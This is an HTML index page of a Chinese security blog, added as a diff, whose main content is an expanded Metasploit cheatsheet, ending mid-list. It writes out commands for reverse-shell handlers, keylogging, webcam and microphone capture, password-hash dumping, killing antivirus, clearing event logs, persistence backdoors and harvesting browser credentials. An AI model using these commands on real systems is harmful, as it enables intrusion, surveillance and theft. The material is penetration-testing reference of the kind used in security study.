@@ -1,0 +1,1371 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"m09ic.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="网络安全,编程学习记录的破地方">
+<meta property="og:type" content="website">
+<meta property="og:title" content="M09ic&#39;s Blog">
+<meta property="og:url" content="https://m09ic.top/page/3/index.html">
+<meta property="og:site_name" content="M09ic&#39;s Blog">
+<meta property="og:description" content="网络安全,编程学习记录的破地方">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="M09ic">
+<meta property="article:tag" content="安全,学习笔记,blog,博客">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://m09ic.top/page/3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>M09ic's Blog</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-140303637-1"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-140303637-1');
+      }
+    </script>
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?04d80448a6c7bfee29f2e7379ff56865";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="M09ic's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">M09ic's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">独自行走于莽荒之地</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://m09ic.top/posts/48529/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="M09ic">
+      <meta itemprop="description" content="网络安全,编程学习记录的破地方">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M09ic's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/48529/" class="post-title-link" itemprop="url">Awesome github</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-05-28 16:57:47" itemprop="dateCreated datePublished" datetime="2019-05-28T16:57:47+08:00">2019-05-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-04 22:52:01" itemprop="dateModified" datetime="2021-01-04T22:52:01+08:00">2021-01-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/posts/48529/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/posts/48529/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>并非是想收集所有好用的github工具,只是记录下最近使用过的好用的github项目.</p>
+<p>大约是从今年三月开始记录,将会持续更新.更早之前用到过的东西如果再次用到也会写上.</p>
+<p>主要用作回看自己的学习经历,顺便收集用.</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/48529/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://m09ic.top/posts/26976/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="M09ic">
+      <meta itemprop="description" content="网络安全,编程学习记录的破地方">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M09ic's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/26976/" class="post-title-link" itemprop="url">SQLMap Cheatsheet</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-05-24 15:30:54" itemprop="dateCreated datePublished" datetime="2019-05-24T15:30:54+08:00">2019-05-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-04 22:53:01" itemprop="dateModified" datetime="2021-01-04T22:53:01+08:00">2021-01-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/posts/26976/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/posts/26976/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">sqlmap源码</a></p>
+<p>整理自多篇文章,参考链接在文章最后.</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/26976/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://m09ic.top/posts/53382/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="M09ic">
+      <meta itemprop="description" content="网络安全,编程学习记录的破地方">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M09ic's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/53382/" class="post-title-link" itemprop="url">MetaSploit CheatSheet</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-05-24 14:42:30" itemprop="dateCreated datePublished" datetime="2019-05-24T14:42:30+08:00">2019-05-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-04 22:52:24" itemprop="dateModified" datetime="2021-01-04T22:52:24+08:00">2021-01-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/posts/53382/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/posts/53382/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><a target="_blank" rel="noopener" href="https://www.metasploit.com/">metasploit官网</a></p>
+<p>整理自多篇文章,参考链接在文章最后.</p>
+<p>GUI工具:<code>armitage</code></p>
+<p>商业版有个web界面,但是不觉得命令行界面更cool吗?</p>
+<p>类似工具<a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/">Cobalt Strike</a></p>
+<p>msf主要有以下模块.</p>
+<ul>
+<li><p>渗透攻击模块(Exploits)</p>
+</li>
+<li><p>辅助模块(Aux)</p>
+</li>
+<li><p>后渗透攻击模块(Post)</p>
+</li>
+<li><p>攻击载荷模块(Payloads)</p>
+</li>
+<li><p>空指令模块(Nops)</p>
+</li>
+<li><p>编码器模块(Encoders)</p>
+<h3 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h3></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用前需要打开postgres数据库</span></span><br><span class="line">service postgresql start</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开msf 控制台终端</span></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 初始化数据库</span></span><br><span class="line">msfdb init</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重新初始化数据库</span></span><br><span class="line">msfdb reinit</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看数据库连接情况</span></span><br><span class="line">db_status</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 建立数据库缓存</span></span><br><span class="line">db_rebuild_cache</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看帮助文档</span></span><br><span class="line">help</span><br></pre></td></tr></table></figure>
+<h3 id="渗透阶段"><a href="#渗透阶段" class="headerlink" title="渗透阶段"></a>渗透阶段</h3><p>其实就是挑选一个模块,然后傻瓜式操作</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">show exploits			# 查看所有可用的渗透攻击程序代码 </span><br><span class="line"></span><br><span class="line">show auxiliary			# 查看所有可用的辅助攻击工具 </span><br><span class="line"></span><br><span class="line">search [args]			# 查找需要的模块</span><br><span class="line"></span><br><span class="line">info [args]				# 查看模块信息</span><br><span class="line"></span><br><span class="line">use [args]				# 进入所选模块</span><br><span class="line"></span><br><span class="line">show payloads			# 查看该模块适用的所有载荷代码 </span><br><span class="line"></span><br><span class="line">show targets			# 查看该模块适用的攻击目标类型</span><br><span class="line"></span><br><span class="line">show options			# 查看所有可用选项</span><br><span class="line"></span><br><span class="line">show advanced			# 查看高级参数</span><br><span class="line"></span><br><span class="line">set [args]				# 设置某个option参数</span><br><span class="line"></span><br><span class="line">save					# 将当期配置保存</span><br><span class="line"></span><br><span class="line">run						# 运行模块</span><br><span class="line"></span><br><span class="line">back					# 回退</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="options"><a href="#options" class="headerlink" title="options"></a>options</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 简单介绍基本参数</span></span><br><span class="line">LHOST			# 获取shell的本地ip</span><br><span class="line"></span><br><span class="line">LPORT			# 获取shell的本机端口</span><br><span class="line"></span><br><span class="line">RHOST			# 攻击目标的ip</span><br><span class="line"></span><br><span class="line">LPORT			# 攻击目标的端口</span><br><span class="line"></span><br><span class="line">PAYLOAD			# 指定payload</span><br><span class="line"></span><br><span class="line">TARGET			# 指定目标主机类型</span><br></pre></td></tr></table></figure>
+<h3 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h3><p>获取一个普通的shell 用nc就可以,但是要获取meterpreter就需要用到handle模块</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/mulit/handler</span><br><span class="line">set payload [PAYLOAD]</span><br><span class="line">set lhost [LHOST]</span><br><span class="line">set lport [LPORT]</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h3><p>根据执行方式区分.payload分为:</p>
+<ul>
+<li>Singles - Singles非常小，旨在建立某种通讯，然后进入下一阶段。 例如，只是创建一个用户。</li>
+<li>Staged - 是一种攻击者用来将更大的文件上传到沦陷的系统的payload。</li>
+<li>Stages - Stages是由Stagers模块下载的payload组件。 各种payload stages提供高级功能，没有规模限制，如Meterpreter和VNC Injection。</li>
+</ul>
+<p>根据连接方式区分,payload分为:</p>
+<ul>
+<li>bind - 在靶机上开放一个端口供攻击机连入</li>
+<li>reverse - 在本机上监听一个端口,靶机主动连接</li>
+</ul>
+<p>根据功能区分,payload分为:</p>
+<ul>
+<li><p>shell  -  功能与系统的shell一样</p>
+</li>
+<li><p>meterpreter  -  集成了很多强大的实用功能</p>
+</li>
+<li><p>vnc injection  -  在目标上打开一个vnc,目标主机需安装vnc服务</p>
+<h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2></li>
+</ul>
+<h3 id="session-管理"><a href="#session-管理" class="headerlink" title="session 管理"></a>session 管理</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">seesions -l 			# 列出可用的session</span><br><span class="line"></span><br><span class="line">sessions -d 			# 列出所有不活跃的session</span><br><span class="line"></span><br><span class="line">sessions -i	[sessionId]	# 指定一个session</span><br><span class="line"></span><br><span class="line">sessions -v				# 列出详细信息</span><br><span class="line"></span><br><span class="line">sessions -c	[command]	# 指定一条命令,通过-i指定session</span><br><span class="line"></span><br><span class="line">sessions -s [script]	# 在session中运行一个脚本,通过-i指定session</span><br><span class="line"></span><br><span class="line">sessions -u	[sessionId]	# 将一个shell升级为metasploit shell</span><br><span class="line"></span><br><span class="line">sessions -k	[sessionId]	# 杀死一个session</span><br><span class="line"></span><br><span class="line">sessions -K				# 杀死所有session</span><br></pre></td></tr></table></figure>
+<h3 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 基本命令</span></span><br><span class="line">background			# 让meterpreter处于后台模式</span><br><span class="line"></span><br><span class="line">quit				# 退出session</span><br><span class="line"></span><br><span class="line">shell				# 获取shell权限</span><br><span class="line"></span><br><span class="line">irb					# 开启ruby终端</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 文件系统命令</span></span><br><span class="line">getwd 				# 查看当前工作目录  </span><br><span class="line"></span><br><span class="line">upload 				 # 上传文件到目标机上  </span><br><span class="line"></span><br><span class="line">download 			# 下载文件到本机上  </span><br><span class="line"></span><br><span class="line">edit 				# 编辑文件  </span><br><span class="line"></span><br><span class="line">search  			# 搜索文件</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 网络命令</span> </span><br><span class="line">ipconfig | ifconfig # 查看网络接口信息  </span><br><span class="line"></span><br><span class="line">arp					# 查看arp表</span><br><span class="line"></span><br><span class="line">route				# 查看路由</span><br><span class="line"></span><br><span class="line">getproxy			# 获取代理</span><br><span class="line"></span><br><span class="line">portfwd  add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发，本机监听4444，把目标机3389转到本机4444 </span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line">route 				# 获取路由表信息</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 系统命令</span></span><br><span class="line">ps 							# 查看当前活跃进程 </span><br><span class="line"></span><br><span class="line">migrate [pid] 				# 将Meterpreter会话移植到进程数位pid的进程中 </span><br><span class="line"></span><br><span class="line">execute -H -i -f cmd.exe 	# 创建新进程cmd.exe，-H不可见，-i交互 </span><br><span class="line"></span><br><span class="line">getpid 						# 获取当前进程的pid </span><br><span class="line"></span><br><span class="line">kill [pid] 					# 杀死进程 </span><br><span class="line"></span><br><span class="line">getuid 						# 查看权限 </span><br><span class="line"></span><br><span class="line">sysinfo 					# 查看目标机系统信息，如机器名，操作系统等 </span><br><span class="line"></span><br><span class="line">shutdown					# 关机</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 实用功能</span></span><br><span class="line">enumdesktops				# 用户登录数</span><br><span class="line"></span><br><span class="line">keyscan_dump				# 键盘记录－下载</span><br><span class="line"></span><br><span class="line">keyscan_start				# 键盘记录　－　开始</span><br><span class="line"></span><br><span class="line">keyscan_stop				# 键盘记录　－　停止</span><br><span class="line"></span><br><span class="line">uictl						# 获取键盘鼠标控制权</span><br><span class="line"></span><br><span class="line">record_mic					# 音频录制</span><br><span class="line"></span><br><span class="line">webcam_chat					# 查看摄像头接口</span><br><span class="line"></span><br><span class="line">webcam_list					# 查看摄像头列表</span><br><span class="line"></span><br><span class="line">webcam_stream				# 摄像头视频获取</span><br><span class="line"></span><br><span class="line">getsystem					# 获取高权限</span><br><span class="line"></span><br><span class="line">hashdump					# 下载账户hash</span><br><span class="line"></span><br><span class="line">migrate						# 将自身注入到其他进程中</span><br><span class="line"></span><br><span class="line">clearev						# 清除痕迹</span><br><span class="line"></span><br><span class="line">screenshot					# 截屏</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> run</span></span><br><span class="line">run [scriptName|moudleName]				# 执行某个模块或脚本	</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 常用模块</span></span><br><span class="line">run  persistence						# persistence 向目标主机注入后门程序</span><br><span class="line"><span class="meta">#</span><span class="bash"> run  persistence -X  -i  5  -p 4444  -r 172.17.11.18</span> </span><br><span class="line"><span class="meta">#</span><span class="bash"> -X 在目标主机上开机自启动</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -i 不断尝试反向连接的时间间隔</span></span><br><span class="line"></span><br><span class="line">run metsvc 								# metsvc 注册服务</span><br><span class="line"></span><br><span class="line">run packetrecorder						# 查看网络流量,-i 指定网卡</span><br><span class="line"></span><br><span class="line">run get_local_subnets					# 获得本地网段</span><br><span class="line"></span><br><span class="line">run getcountermeasure					# 显示HIPS和AV进程的列表，显示远程机器的防火墙规则，列出DEP和UAC策略</span><br><span class="line"></span><br><span class="line">run scraper								# 获取网络共享信息</span><br><span class="line"></span><br><span class="line">run killav								# 中止杀毒软件进程</span><br><span class="line"></span><br><span class="line">run vnc									# 获得vnc远程桌面</span><br><span class="line"></span><br><span class="line">run getgui  -e 							# 开启远程桌面 </span><br><span class="line"></span><br><span class="line">run getgui -u example_username -p example_password # 添加账号</span><br><span class="line"><span class="meta">#</span><span class="bash"> 完整脚本列表在kali: /usr/share/metasploit-framework/scripts/meterpreter</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 常用模块</span></span><br><span class="line">post/windows/gather/forensics/enum_drives	# 枚举存储器信息</span><br><span class="line"></span><br><span class="line">post/windows/gather/checkvm					# 检查是否是虚拟机</span><br><span class="line"></span><br><span class="line">post/windows/gather/enum_applications		# 获取目标主机上的软件安装信息</span><br><span class="line"></span><br><span class="line">post/windows/gather/dumplinks				# 获取目标主机上最近访问过的文档、链接信息</span><br><span class="line"></span><br><span class="line">post/windows/gather/enum_ie					# 读取目标主机IE浏览器cookies等缓存信息，嗅探目标主机登录过的各类账号密码</span><br><span class="line"></span><br><span class="line">post/windows/manage/killav 					# 